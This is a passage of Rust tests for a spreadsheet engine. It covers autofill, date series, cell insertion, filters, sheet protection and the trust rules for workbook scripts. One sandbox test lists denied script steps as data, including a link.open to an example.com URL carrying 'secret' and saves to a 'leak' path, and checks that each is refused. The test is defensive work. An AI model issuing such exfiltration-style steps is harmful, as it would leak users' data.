    s.execute("cell.set", json!({"cell": "F1", "input": "abc"})).unwrap();
    s.execute("edit.autoFill", json!({"source": "F1", "target": "F1:F2", "mode": "alternate"})).unwrap();
    assert_eq!(v(&s, "F2"), Value::from("abc"));
    s.execute("edit.autoFill", json!({"source": "G1", "target": "G1:G3", "mode": "alternate"})).unwrap();
    assert_eq!(v(&s, "G3"), Value::Empty);
}

#[test]
fn fill_series_from_the_right_drag_menu_counts_a_lone_number() {
    // Excel's right-drag Fill Series: a lone number counts up, everything else extends as a plain drag.
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "7"})).unwrap();
    s.execute("edit.autoFill", json!({"source": "A1", "target": "A1:A3", "mode": "extend"})).unwrap();
    assert_eq!([v(&s, "A2"), v(&s, "A3")], [Value::Number(8.0), Value::Number(9.0)]);
    s.execute("range.setValues", json!({"range": "B1", "values": [[1], [3]]})).unwrap();
    s.execute("edit.autoFill", json!({"source": "B1:B2", "target": "B1:B4", "mode": "extend"})).unwrap();
    assert_eq!([v(&s, "B3"), v(&s, "B4")], [Value::Number(5.0), Value::Number(7.0)]);
    s.execute("cell.set", json!({"cell": "C1", "input": "Item 9"})).unwrap();
    s.execute("edit.autoFill", json!({"source": "C1", "target": "C1:C2", "mode": "extend"})).unwrap();
    assert_eq!(v(&s, "C2"), Value::from("Item 10"));
    // A source with no common pattern continues each cell's own series, as a plain drag does.
    s.execute("range.setValues", json!({"range": "D1", "values": [["Product 1"], ["On backorder"]]})).unwrap();
    s.execute("edit.autoFill", json!({"source": "D1:D2", "target": "D1:D4", "mode": "extend"})).unwrap();
    assert_eq!([v(&s, "D3"), v(&s, "D4")], [Value::from("Product 2"), Value::from("On backorder")]);
}

#[test]
fn fill_without_formatting_extends_the_series_and_keeps_the_target_formats() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [[1], [2], [null], [9]]})).unwrap();
    s.execute("home.bold", json!({"range": "A1:A2", "on": true})).unwrap();
    s.execute("home.italic", json!({"range": "A4", "on": true})).unwrap();
    s.execute("edit.autoFill", json!({"source": "A1:A2", "target": "A1:A4", "mode": "values"})).unwrap();
    assert_eq!([v(&s, "A3"), v(&s, "A4")], [Value::Number(3.0), Value::Number(4.0)]);
    let d = s.doc().unwrap();
    let sh = d.wb.active().unwrap();
    let a4 = d.wb.styles.get(sh.style_id(CellRef::parse("A4").unwrap()));
    assert!(a4.font.italic && !a4.font.bold, "A4 keeps its own formats");
    assert!(!d.wb.styles.get(sh.style_id(CellRef::parse("A3").unwrap())).font.bold);
    s.execute("range.setValues", json!({"range": "B1", "values": [["Product 1"], ["On backorder"]]})).unwrap();
    s.execute("edit.autoFill", json!({"source": "B1:B2", "target": "B1:B4", "mode": "values"})).unwrap();
    assert_eq!([v(&s, "B3"), v(&s, "B4")], [Value::from("Product 2"), Value::from("On backorder")]);
}

#[test]
fn fill_days_weekdays_months_and_years_step_a_date_by_that_unit() {
    let mut s = s();
    let serials = |s: &Session, cells: &[&str]| cells.iter().map(|c| v(s, c)).collect::<Vec<_>>();
    let n = |xs: &[f64]| xs.iter().map(|x| Value::Number(*x)).collect::<Vec<_>>();
    // Friday 1/30/2026 is serial 46052.
    s.execute("cell.set", json!({"cell": "A1", "input": "1/30/2026"})).unwrap();
    assert_eq!(v(&s, "A1"), Value::Number(46052.0), "setup: a date");
    s.execute("edit.autoFill", json!({"source": "A1", "target": "A1:A4", "mode": "days"})).unwrap();
    assert_eq!(serials(&s, &["A2", "A3", "A4"]), n(&[46053.0, 46054.0, 46055.0]));
    // Fill Weekdays skips Saturday 1/31 and Sunday 2/1.
    s.execute("edit.autoFill", json!({"source": "A1", "target": "A1:A4", "mode": "weekdays"})).unwrap();
    assert_eq!(serials(&s, &["A2", "A3", "A4"]), n(&[46055.0, 46056.0, 46057.0]));
    // From Saturday 1/31, the first weekday is Monday 2/2.
    s.execute("cell.set", json!({"cell": "B1", "input": "1/31/2026"})).unwrap();
    s.execute("edit.autoFill", json!({"source": "B1", "target": "B1:B3", "mode": "weekdays"})).unwrap();
    assert_eq!(serials(&s, &["B2", "B3"]), n(&[46055.0, 46056.0]));
    // Fill Months keeps the day, clamped to the month's last day: Feb 28, Mar 31, Apr 30.
    s.execute("edit.autoFill", json!({"source": "B1", "target": "B1:B4", "mode": "months"})).unwrap();
    assert_eq!(serials(&s, &["B2", "B3", "B4"]), n(&[46081.0, 46112.0, 46142.0]));
    s.execute("edit.autoFill", json!({"source": "B1", "target": "B1:B3", "mode": "years"})).unwrap();
    assert_eq!(serials(&s, &["B2", "B3"]), n(&[46418.0, 46783.0]));
    // Two dates step by their difference in the unit: 1/15 and 3/15 by two months.
    s.execute("cell.set", json!({"cell": "C1", "input": "1/15/2026"})).unwrap();
    s.execute("cell.set", json!({"cell": "C2", "input": "3/15/2026"})).unwrap();
    s.execute("edit.autoFill", json!({"source": "C1:C2", "target": "C1:C4", "mode": "months"})).unwrap();
    assert_eq!(serials(&s, &["C3", "C4"]), n(&[46157.0, 46218.0]));
    // Monday 2/2 and Wednesday 2/4 step by two weekdays: Friday 2/6, Tuesday 2/10.
    s.execute("cell.set", json!({"cell": "D1", "input": "2/2/2026"})).unwrap();
    s.execute("cell.set", json!({"cell": "D2", "input": "2/4/2026"})).unwrap();
    s.execute("edit.autoFill", json!({"source": "D1:D2", "target": "D1:D4", "mode": "weekdays"})).unwrap();
    assert_eq!(serials(&s, &["D3", "D4"]), n(&[46059.0, 46063.0]));
    // Upward from Monday 2/2: Friday 1/30, Thursday 1/29.
    s.execute("cell.set", json!({"cell": "E5", "input": "2/2/2026"})).unwrap();
    s.execute("edit.autoFill", json!({"source": "E5", "target": "E3:E5", "mode": "weekdays"})).unwrap();
    assert_eq!(serials(&s, &["E4", "E3"]), n(&[46052.0, 46051.0]));
    // A number that isn't a date fills as a plain drag does: a lone number copies.
    s.execute("cell.set", json!({"cell": "F1", "input": "7"})).unwrap();
    s.execute("edit.autoFill", json!({"source": "F1", "target": "F1:F2", "mode": "days"})).unwrap();
    assert_eq!(v(&s, "F2"), Value::Number(7.0));
    // An upper-case date format is a date: 1/31/2026 as YYYY-MM-DD fills by months.
    s.execute("cell.set", json!({"cell": "G1", "input": "1/31/2026"})).unwrap();
    s.execute("home.numberFormat", json!({"range": "G1", "code": "YYYY-MM-DD"})).unwrap();
    s.execute("edit.autoFill", json!({"source": "G1", "target": "G1:G2", "mode": "months"})).unwrap();
    assert_eq!(v(&s, "G2"), Value::Number(46081.0));
    // A date with a time keeps the time: Fill Months and Fill Weekdays, a plain drag of two dates
    // a month apart, and the Series dialog by months.
    s.execute("cell.set", json!({"cell": "H1", "input": "1/31/2026 12:00"})).unwrap();
    assert_eq!(v(&s, "H1"), Value::Number(46053.5), "setup: a date and time");
    s.execute("edit.autoFill", json!({"source": "H1", "target": "H1:H2", "mode": "months"})).unwrap();
    assert_eq!(v(&s, "H2"), Value::Number(46081.5));
    s.execute("edit.autoFill", json!({"source": "H1", "target": "H1:H2", "mode": "weekdays"})).unwrap();
    assert_eq!(v(&s, "H2"), Value::Number(46055.5));
    s.execute("cell.set", json!({"cell": "I1", "input": "1/15/2026 6:00"})).unwrap();
    s.execute("cell.set", json!({"cell": "I2", "input": "2/15/2026 6:00"})).unwrap();
    s.execute("edit.autoFill", json!({"source": "I1:I2", "target": "I1:I3"})).unwrap();
    assert_eq!(v(&s, "I3"), Value::Number(46096.25));
    s.execute("cell.set", json!({"cell": "J1", "input": "1/31/2026 12:00"})).unwrap();
    s.execute("edit.fillSeries", json!({"range": "J1:J2", "type": "date", "dateUnit": "month"})).unwrap();
    assert_eq!(v(&s, "J2"), Value::Number(46081.5));
}

#[test]
fn only_a_number_in_a_date_format_offers_the_date_fills() {
    let mut s = s();
    let dates = |s: &Session, a: &str| crate::fill::starts_with_date(&s.doc().unwrap().wb, 0, gridcraft_core::RangeRef::parse(a).unwrap());
    s.execute("cell.set", json!({"cell": "A1", "input": "1/31/2026"})).unwrap();
    s.execute("cell.set", json!({"cell": "A2", "input": "7"})).unwrap();
    s.execute("home.numberFormat", json!({"range": "A2", "code": "0 \"days\""})).unwrap();
    s.execute("cell.set", json!({"cell": "A3", "input": "46053"})).unwrap();
    s.execute("home.numberFormat", json!({"range": "A3", "code": "YYYY-MM-DD"})).unwrap();
    s.execute("cell.set", json!({"cell": "A4", "input": "=A1"})).unwrap();
    s.execute("cell.set", json!({"cell": "A5", "input": "13:30"})).unwrap();
    assert!(dates(&s, "A1") && dates(&s, "A3"), "m/d/yyyy and YYYY-MM-DD are dates");
    assert!(!dates(&s, "A2"), "quoted text in a number format is not a date field");
    assert!(!dates(&s, "A4"), "a formula is not offered");
    assert!(!dates(&s, "A5"), "a time is not a date");
    assert!(!dates(&s, "A6"), "an empty cell is not a date");
}

#[test]
fn insert_delete_cells_adjust() {
    let formula = |s: &mut Session, a: &str| s.execute("cell.get", json!({"cell": a})).unwrap()["formula"].clone();
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [[1], [2], [3], [4], [5]]})).unwrap();
    s.execute("cell.set", json!({"cell": "C1", "input": "=SUM(A1:A5)"})).unwrap();
    s.execute("cell.set", json!({"cell": "C2", "input": "=A4*10"})).unwrap();
    s.execute("cell.set", json!({"cell": "C3", "input": "=SUM(A1:B5)"})).unwrap();
    s.execute("formulas.defineName", json!({"name": "Fourth", "refersTo": "=Sheet1!$A$4"})).unwrap();
    s.execute(
        "home.conditionalFormat",
        json!({"range": "A4:A5", "rule": {"type": "cellIs", "operator": "greater", "value": "3", "preset": "redText"}}),
    )
    .unwrap();
    s.execute("data.validation", json!({"range": "A5", "type": "whole", "operator": "greater", "formula1": "0"})).unwrap();
    s.execute("insert.chart", json!({"range": "A1:A5", "type": "line"})).unwrap();
    // Insert A3 shifting down: ranges across the insertion grow, references below move.
    s.execute("home.insertCells", json!({"range": "A3", "shift": "down"})).unwrap();
    assert_eq!(formula(&mut s, "C1"), "=SUM(A1:A6)");
    assert_eq!(formula(&mut s, "C2"), "=A5*10");
    assert_eq!(formula(&mut s, "C3"), "=SUM(A1:B5)");
    assert_eq!(v(&s, "C2"), Value::Number(40.0));
    let sh = s.doc().unwrap().wb.active().unwrap().clone();
    assert_eq!(s.doc().unwrap().wb.names[0].formula, "Sheet1!$A$5");
    assert_eq!(sh.cond_formats[0].ranges[0].a1(), "A5:A6");
    assert_eq!(sh.validations[0].ranges[0].a1(), "A6");
    assert_eq!(sh.charts[0].series[0].values, "Sheet1!$A$1:$A$6");
    // Delete A5 (the 4) shifting up: references to it become #REF!, those below move up.
    s.execute("home.deleteCells", json!({"range": "A5", "shift": "up"})).unwrap();
    assert_eq!(formula(&mut s, "C1"), "=SUM(A1:A5)");
    assert_eq!(formula(&mut s, "C2"), "=#REF!*10");
    assert_eq!(s.doc().unwrap().wb.names[0].formula, "#REF!");
    assert_eq!(v(&s, "C1"), Value::Number(11.0));
    let sh = s.doc().unwrap().wb.active().unwrap().clone();
    assert_eq!(sh.cond_formats[0].ranges[0].a1(), "A5");
    assert_eq!(sh.validations[0].ranges[0].a1(), "A5");
    assert_eq!(sh.charts[0].series[0].values, "Sheet1!$A$1:$A$5");
    // Shifting right and left.
    s.execute("range.setValues", json!({"range": "E1", "values": [[1, 2, 3]]})).unwrap();
    s.execute("cell.set", json!({"cell": "E3", "input": "=G1+SUM(E1:G1)"})).unwrap();
    s.execute("home.insertCells", json!({"range": "F1", "shift": "right"})).unwrap();
    assert_eq!(formula(&mut s, "E3"), "=H1+SUM(E1:H1)");
    s.execute("home.deleteCells", json!({"range": "E1:F1", "shift": "left"})).unwrap();
    assert_eq!(formula(&mut s, "E3"), "=F1+SUM(E1:F1)");
    assert_eq!(v(&s, "E3"), Value::Number(8.0));
}

#[test]
fn sort_and_filter() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["Name", "Score"], ["b", 2], ["c", 3], ["a", 1]]})).unwrap();
    s.execute("selection.set", json!({"cell": "B2"})).unwrap();
    s.execute("data.sortDescending", json!({})).unwrap();
    assert_eq!(v(&s, "A2"), Value::from("c"));
    assert_eq!(v(&s, "A1"), Value::from("Name"));
    s.execute("data.filter", json!({})).unwrap();
    let r = s.execute("data.filterBy", json!({"column": "B", "custom": {"op": ">", "value": "1"}})).unwrap();
    assert_eq!(r["hiddenRows"], 1);
}

/// Delete and the Clear commands on a filtered selection clear only the rows showing, as in
/// Excel (#1419); rows hidden by hand are cleared with the rest.
#[test]
fn clearing_a_filtered_selection_leaves_the_rows_the_filter_hides() {
    let mut s = s();
    let rows = [["Name", "Status"], ["John", "Active"], ["Mary", "Inactive"], ["David", "Active"], ["Sarah", "Inactive"], ["Michael", "Active"]];
    s.execute("range.setValues", json!({"range": "A1", "values": rows})).unwrap();
    s.execute("home.bold", json!({"range": "A2:A6", "on": true})).unwrap();
    s.execute("review.newNote", json!({"cell": "A3", "text": "note", "author": "Example"})).unwrap();
    s.execute("selection.set", json!({"cell": "A1"})).unwrap();
    s.execute("data.filter", json!({})).unwrap();
    s.execute("data.filterBy", json!({"column": "B", "values": ["Active"]})).unwrap();
    let bold = |s: &Session, a: &str| {
        let d = s.doc().unwrap();
        d.wb.styles.get(d.wb.active().unwrap().style_id(CellRef::parse(a).unwrap())).font.bold
    };

    s.execute("edit.clearContents", json!({"range": "A2:A6"})).unwrap();
    for a in ["A2", "A4", "A6"] {
        assert_eq!(v(&s, a), Value::Empty, "{a} shows and is cleared");
    }
    assert_eq!(v(&s, "A3"), Value::from("Mary"));
    assert_eq!(v(&s, "A5"), Value::from("Sarah"));

    s.execute("edit.clearFormats", json!({"range": "A2:A6"})).unwrap();
    assert!(!bold(&s, "A2"));
    assert!(bold(&s, "A3"), "a filtered-out row keeps its format");

    s.execute("edit.clearAll", json!({"range": "A2:B6"})).unwrap();
    assert_eq!(v(&s, "B2"), Value::Empty);
    assert_eq!(v(&s, "B3"), Value::from("Inactive"));
    assert_eq!(v(&s, "A5"), Value::from("Sarah"));
    assert!(s.doc().unwrap().wb.active().unwrap().comments.contains_key(&CellRef::parse("A3").unwrap()));

    // Without the filter, a row hidden by hand is cleared like the rows around it.
    s.execute("data.clearFilter", json!({})).unwrap();
    s.execute("home.hideRows", json!({"rows": "5:5"})).unwrap();
    s.execute("edit.clearContents", json!({"range": "A3:A5"})).unwrap();
    assert_eq!(v(&s, "A3"), Value::Empty);
    assert_eq!(v(&s, "A5"), Value::Empty);
}

/// Top 10 keeps the top or bottom N items or percent, ties at the threshold included.
#[test]
fn filter_top10_items_and_percent() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["Score"], [5], [1], [9], [3], [9], [7], ["x"]]})).unwrap();
    s.execute("selection.set", json!({"cell": "A1"})).unwrap();
    s.execute("data.filter", json!({})).unwrap();
    // Top 2 items: 9, 9 (the "x" text row is hidden too).
    let r = s.execute("data.filterBy", json!({"column": "A", "top": {"count": 2}})).unwrap();
    assert_eq!(r["hiddenRows"], 5);
    // Bottom 2 items: 1, 3.
    let r = s.execute("data.filterBy", json!({"column": "A", "top": {"count": 2, "bottom": true}})).unwrap();
    assert_eq!(r["hiddenRows"], 5);
    // Top 50 percent of 6 numbers = 3 items; the threshold 7 keeps 9, 9, 7.
    let r = s.execute("data.filterBy", json!({"column": "A", "top": {"count": 50, "percent": true}})).unwrap();
    assert_eq!(r["hiddenRows"], 4);
}

/// Two Top 10 criteria on one column (possible in a native JSON file) each keep their own
/// cutoff: Top 3 and Bottom 4 of 1..5 keep 3 and 4.
#[test]
fn filter_top10_two_criteria_on_one_column() {
    use gridcraft_model::FilterCriterion;
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["N"], [1], [2], [3], [4], [5]]})).unwrap();
    s.execute("selection.set", json!({"cell": "A1"})).unwrap();
    s.execute("data.filter", json!({})).unwrap();
    let sh = std::sync::Arc::make_mut(&mut s.doc_mut().unwrap().wb).sheet_mut(0).unwrap();
    if let Some(af) = sh.autofilter.as_mut() {
        af.criteria = vec![
            (0, FilterCriterion::Top10 { bottom: false, percent: false, count: 3 }),
            (0, FilterCriterion::Top10 { bottom: true, percent: false, count: 4 }),
        ];
    }
    s.execute("data.reapply", json!({})).unwrap();
    let hidden: Vec<u32> = s.active().unwrap().wb.sheet(0).unwrap().rows.iter().filter(|(_, r)| r.hidden).map(|(k, _)| *k).collect();
    // Rows are 0-based: values 1, 2 and 5 sit on rows 1, 2 and 5.
    assert_eq!(hidden, vec![1, 2, 5]);
}

/// Turning the filter on with only the header row selected filters the data below it (#201).
#[test]
fn filter_on_a_selected_header_row_covers_the_data_below() {
    let mut s = s();
    s.execute(
        "range.setValues",
        json!({"range": "A1", "values": [["Name", "City"], ["Ana", "SP"], ["Bia", "RJ"], ["Caio", "SP"], ["Duda", "BH"], ["Eva", "RJ"]]}),
    )
    .unwrap();
    s.execute("selection.set", json!({"range": "A1:B1"})).unwrap();
    let r = s.execute("data.filter", json!({})).unwrap();
    assert_eq!(r["range"], "A1:B6");
    let r = s.execute("data.filterBy", json!({"column": "B", "values": ["SP"]})).unwrap();
    assert_eq!(r["hiddenRows"], 3);
    // An explicit range is taken as given.
    s.execute("data.filter", json!({})).unwrap();
    let r = s.execute("data.filter", json!({"range": "A1:B1"})).unwrap();
    assert_eq!(r["range"], "A1:B1");
}

#[test]
fn protection_passwords_stay_out_of_the_journal_and_recorded_scripts() {
    const PW: &str = "synthetic-pw-7319";
    let mut s = s();
    s.execute("automate.recordActions", json!({})).unwrap();
    s.execute("review.protectSheet", json!({"password": PW, "formatCells": true})).unwrap();
    // The password still protects the sheet; the refused attempt isn't journaled.
    assert!(s.execute("review.unprotectSheet", json!({})).is_err());
    s.execute("review.unprotectSheet", json!({"password": PW})).unwrap();
    s.execute("automate.recordActions", json!({"stop": true, "name": "Lock"})).unwrap();

    let journal = serde_json::to_string(&s.journal).unwrap();
    assert!(!journal.contains(PW), "{journal}");
    let params = |s: &Session, id: &str| s.journal.iter().find(|(c, _)| c == id).map(|(_, p)| p.clone());
    assert_eq!(params(&s, "review.protectSheet"), Some(json!({"formatCells": true})));
    assert_eq!(params(&s, "review.unprotectSheet"), Some(json!({})));

    // The recorded script is stored in the workbook, so it is saved with the file.
    let bytes = crate::io::save_bytes(&s.doc().unwrap().wb, "book.xlsx").unwrap();
    let (reopened, _) = crate::io::open_bytes("book.xlsx", &bytes).unwrap();
    let script = reopened.names.iter().find(|n| n.name == "_sc_scripts").map(|n| n.formula.clone()).unwrap();
    assert!(script.contains("review.protectSheet"), "{script}");
    assert!(!script.contains(PW), "{script}");

    // The journal still replays: protection without a password, then unprotection.
    let mut r = self::s();
    for (id, p) in s.journal.iter().filter(|(id, _)| !id.starts_with("automate.")) {
        r.execute(id, p.clone()).unwrap_or_else(|e| panic!("{id}: {e}"));
        let prot = r.doc().unwrap().wb.active().unwrap().protection.clone();
        if id == "review.protectSheet" {
            assert!(prot.as_ref().is_some_and(|p| p.format_cells && p.password.is_none()), "{prot:?}");
        }
    }
    assert!(r.doc().unwrap().wb.active().unwrap().protection.is_none());
    s.execute("automate.runScript", json!({"name": "Lock"})).unwrap();
}

/// A session holding a workbook opened from file bytes whose `Fill` script sets B1 (#2178).
fn opened_with_script() -> Session {
    let mut author = s();
    author
        .execute("automate.newScript", json!({"name": "Fill", "commands": [{"command": "cell.set", "params": {"cell": "B1", "input": "ran"}}]}))
        .unwrap();
    let bytes = crate::io::save_bytes(&author.doc().unwrap().wb, "book.xlsx").unwrap();
    let mut s = Session::new();
    s.execute("file.open", json!({"name": "downloaded.xlsx", "base64": crate::io::base64_encode(&bytes)})).unwrap();
    s
}

#[test]
fn scripts_written_in_this_session_run_without_a_trust_step() {
    let mut s = s();
    assert!(s.doc().unwrap().scripts_trusted);
    s.execute("automate.newScript", json!({"name": "Fill", "commands": [{"command": "cell.set", "params": {"cell": "B1", "input": "ran"}}]}))
        .unwrap();
    assert_eq!(s.execute("automate.runScript", json!({"name": "Fill"})).unwrap()["ran"], 1);
    assert_eq!(v(&s, "B1"), Value::Text("ran".into()));
}

#[test]
fn untrusted_workbook_scripts_are_refused_until_trusted() {
    let mut s = opened_with_script();
    s.ui_requests.clear();
    assert!(!s.doc().unwrap().scripts_trusted, "a workbook opened with scripts starts untrusted");
    let listed = s.execute("automate.allScripts", json!({})).unwrap();
    assert_eq!(listed[0]["trusted"], false, "{listed}");
    let err = s.execute("automate.runScript", json!({"name": "Fill"})).unwrap_err().to_string();
    assert!(err.contains("trust"), "{err}");
    assert_eq!(v(&s, "B1"), Value::Empty, "no step of an untrusted script runs");
    // Trust can't be smuggled in as a string, and nothing opens a dialog.
    assert!(s.execute("automate.runScript", json!({"name": "Fill", "trusted": "yes"})).is_err());
    assert!(s.ui_requests.is_empty(), "{:?}", s.ui_requests);

    // An explicit `trusted: true` runs it this once without trusting the workbook.
    s.execute("automate.runScript", json!({"name": "Fill", "trusted": true})).unwrap();
    assert_eq!(v(&s, "B1"), Value::Text("ran".into()));
    assert!(!s.doc().unwrap().scripts_trusted);
    s.execute("cell.set", json!({"cell": "B1", "input": ""})).unwrap();
    assert!(s.execute("automate.runScript", json!({"name": "Fill"})).is_err());

    // Trusting the workbook (the UI's Trust Scripts action) lets its scripts run this session.
    assert_eq!(s.execute("automate.trustScripts", json!({})).unwrap()["trusted"], true);
    s.execute("automate.runScript", json!({"name": "Fill"})).unwrap();
    assert_eq!(v(&s, "B1"), Value::Text("ran".into()));
    // A second window on the same workbook keeps the decision; withdrawing it disables them again.
    s.execute("view.newWindow", json!({})).unwrap();
    assert!(s.doc().unwrap().scripts_trusted);
    s.execute("automate.trustScripts", json!({"trusted": false})).unwrap();
    assert!(s.execute("automate.runScript", json!({"name": "Fill"})).is_err());
}

#[test]
fn trust_scripts_only_defaults_to_trusted_when_the_flag_is_missing() {
    let mut s = opened_with_script();
    // A `trusted` that isn't a boolean is an error and leaves the workbook untrusted.
    for wrong in [json!("false"), json!("true"), json!(0), json!(1), json!(null), json!([true])] {
        let err = s.execute("automate.trustScripts", json!({"trusted": wrong})).unwrap_err().to_string();
        assert!(err.contains("trusted"), "{wrong}: {err}");
        assert!(!s.doc().unwrap().scripts_trusted, "{wrong} must not trust the workbook");
        assert!(s.execute("automate.runScript", json!({"name": "Fill"})).is_err());
    }
    // The refusal names where the Trust Scripts button actually is.
    let err = s.execute("automate.runScript", json!({"name": "Fill"})).unwrap_err().to_string();
    assert!(err.contains("View › Macros") && err.contains("automate.trustScripts"), "{err}");
    assert_eq!(s.execute("automate.trustScripts", json!({"trusted": false})).unwrap()["trusted"], false);
    assert!(!s.doc().unwrap().scripts_trusted);
    assert_eq!(s.execute("automate.trustScripts", json!({})).unwrap()["trusted"], true);
    assert!(s.doc().unwrap().scripts_trusted);
}

#[test]
fn scripts_leave_file_access_working_after_they_run() {
    // The sandbox a script runs in is lifted afterwards, also when a step fails.
    let dir = std::env::temp_dir().join(format!("gridcraft-script-sandbox-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).unwrap();
    let csv = dir.join("in.csv");
    std::fs::write(&csv, b"a,b\n1,2\n").unwrap();
    let csv = csv.to_string_lossy().to_string();
    let mut s = s();
    let bad_step = json!({"command": "cell.set", "params": {"cell": "not a cell", "input": "x"}});
    s.execute("automate.newScript", json!({"name": "Bad", "commands": [bad_step]})).unwrap();
    assert!(s.execute("automate.runScript", json!({"name": "Bad"})).is_err());
    s.execute("automate.newScript", json!({"name": "Ok", "commands": [{"command": "cell.set", "params": {"cell": "A1", "input": "1"}}]})).unwrap();
    s.execute("automate.runScript", json!({"name": "Ok"})).unwrap();
    s.execute("data.fromTextCsv", json!({"path": csv})).unwrap();
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn get_data_refuses_json_with_too_many_fields_or_rows_before_building_rows() {
    let mut s = s();
    let wide = format!("[{}]", (0..=gridcraft_core::MAX_COLS).map(|i| format!("{{\"k{i}\":1}}")).collect::<Vec<_>>().join(","));
    let err = s.execute("data.fromTextCsv", json!({"text": wide})).unwrap_err().to_string();
    assert!(err.contains("more fields"), "{err}");
    // MAX_ROWS objects plus the header row are one too many.
    let tall = format!("[{}]", vec!["{}"; gridcraft_core::MAX_ROWS as usize].join(","));
    let err = s.execute("data.fromTextCsv", json!({"text": tall})).unwrap_err().to_string();
    assert!(err.contains("more rows"), "{err}");
}

#[test]
fn scripts_cannot_reach_outside_the_workbook_even_when_trusted() {
    let dir = std::env::temp_dir().join(format!("gridcraft-script-deny-{}", std::process::id()));
    let leak = dir.join("leak.xlsx");
    let leak = leak.to_string_lossy().to_string();
    let mut s = opened_with_script();
    s.ui_requests.clear();
    s.execute("automate.trustScripts", json!({})).unwrap();
    let denied = [
        json!({"command": "link.open", "params": {"url": "https://example.com/?d=secret"}}),
        json!({"command": "file.saveAs", "params": {"path": leak}}),
        json!({"command": "file.save", "params": {}}),
        json!({"command": "file.exportPdf", "params": {"path": leak}}),
        json!({"command": "file.open", "params": {"path": leak}}),
        json!({"command": "data.getData", "params": {"path": leak}}),
        json!({"command": "data.fromTextCsv", "params": {"path": leak}}),
        json!({"command": "insert.picture", "params": {"path": leak}}),
    ];
    for step in denied {
        // The harmless first step proves the whole script is refused before anything runs.
        let first = json!({"command": "cell.set", "params": {"cell": "C1", "input": "partial"}});
        s.execute("automate.newScript", json!({"name": "Leak", "commands": [first, step]})).unwrap();
        let r = s.execute("automate.runScript", json!({"name": "Leak", "trusted": true}));
        assert!(r.is_err(), "{step} must be refused");
        assert_eq!(v(&s, "C1"), Value::Empty, "{step}: no step runs");
    }
    assert!(!s.ui_requests.iter().any(|r| matches!(r, crate::UiRequest::OpenUrl(_))), "{:?}", s.ui_requests);
    assert!(!std::path::Path::new(&leak).exists());
    // Data a script supplies itself is still fine.
    s.execute("automate.newScript", json!({"name": "Csv", "commands": [{"command": "data.fromTextCsv", "params": {"text": "a,b\n1,2"}}]})).unwrap();
    s.execute("automate.runScript", json!({"name": "Csv"})).unwrap();
}

/// A sheet with locked data in A1:B3, unlocked cells in D1:D3 and row 10, then protected.
fn protected(extra: serde_json::Value) -> Session {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [[1], [2], [3]]})).unwrap();
    s.execute("cell.set", json!({"cell": "B1", "input": "=A1+D1"})).unwrap();
    s.execute("range.setValues", json!({"range": "D1", "values": [[10], [20], [30]]})).unwrap();
    s.execute("home.lockCell", json!({"range": "D1:D3", "on": false})).unwrap();
    s.execute("home.lockCell", json!({"range": "10:10", "on": false})).unwrap();
    s.execute("review.protectSheet", extra).unwrap();
    s
}

#[test]
fn protection_refuses_edits_of_locked_cells() {
    let refused = |s: &mut Session, id: &str, p: serde_json::Value| {
        let before = s.doc().unwrap().wb.clone();
        let e = s.execute(id, p).expect_err(id).to_string();
        assert!(e.contains("protected sheet"), "{id}: {e}");
        assert_eq!(*s.doc().unwrap().wb, *before, "{id} changed the workbook");
    };
    let mut s = protected(json!({}));
    refused(&mut s, "cell.set", json!({"cell": "A1", "input": "9"}));
    refused(&mut s, "edit.clearContents", json!({"range": "A1:A3"}));
    refused(&mut s, "edit.clearAll", json!({"range": "A1"}));
    refused(&mut s, "range.setValues", json!({"range": "A2", "values": [[9]]}));
    refused(&mut s, "range.fill", json!({"range": "A5:A6", "input": "x"}));
    refused(&mut s, "edit.fillDown", json!({"range": "A1:A3"}));
    refused(&mut s, "edit.fillRight", json!({"range": "A1:B1"}));
    refused(&mut s, "edit.fillUp", json!({"range": "A1:A3"}));
    refused(&mut s, "edit.fillLeft", json!({"range": "A1:B1"}));
    refused(&mut s, "edit.autoFill", json!({"source": "A1", "target": "A1:A5"}));
    s.execute("edit.copy", json!({"range": "D1"})).unwrap();
    refused(&mut s, "edit.paste", json!({"at": "A2"}));
    refused(&mut s, "edit.paste", json!({"at": "A2", "text": "x\ty"}));
    refused(&mut s, "home.deleteRows", json!({"rows": "2:2"}));
    refused(&mut s, "home.deleteColumns", json!({"cols": "A:A"}));
    refused(&mut s, "home.insertRows", json!({"rows": "1:1"}));
    refused(&mut s, "home.deleteCells", json!({"range": "A1", "shift": "up"}));
    refused(&mut s, "home.insertCells", json!({"range": "A1", "shift": "down"}));
    refused(&mut s, "edit.replace", json!({"what": "2", "with": "5"}));
    refused(&mut s, "data.goalSeek", json!({"set": "B1", "to": 50, "changing": "A1"}));
    // Unlocked cells stay editable.
    s.execute("edit.paste", json!({"at": "D2"})).unwrap();
    assert_eq!(v(&s, "D2"), Value::Number(10.0));
    s.execute("range.setValues", json!({"range": "D2", "values": [[5]]})).unwrap();
    s.execute("edit.fillDown", json!({"range": "D1:D3"})).unwrap();
    assert_eq!(v(&s, "D3"), Value::Number(10.0));
    s.execute("edit.clearContents", json!({"range": "D3"})).unwrap();
    assert_eq!(v(&s, "D3"), Value::Empty);
    s.execute("data.goalSeek", json!({"set": "B1", "to": 50, "changing": "D1"})).unwrap();
    assert!((v(&s, "B1").as_f64().unwrap() - 50.0).abs() < 0.001);
    s.execute("edit.replace", json!({"what": "49", "with": "48", "wholeCell": true})).unwrap();
    assert_eq!(v(&s, "A1"), Value::Number(1.0));
}

#[test]
fn locked_cell_message_matches_what_an_edit_would_be_refused_with() {
    let s = protected(json!({}));
    let locked = CellRef::parse("A1").unwrap();
    let unlocked = CellRef::parse("D1").unwrap();

    assert!(s.locked_cell_message(0, locked).is_some_and(|m| m.contains("protected sheet")));
    assert_eq!(s.locked_cell_message(0, unlocked), None, "an unlocked cell stays editable");
    assert_eq!(s.locked_cell_message(9, locked), None, "no such sheet");
}

#[test]
fn protection_allows_permitted_row_and_column_edits() {
    let mut s = protected(json!({"insertRows": true, "deleteRows": true, "insertColumns": true}));
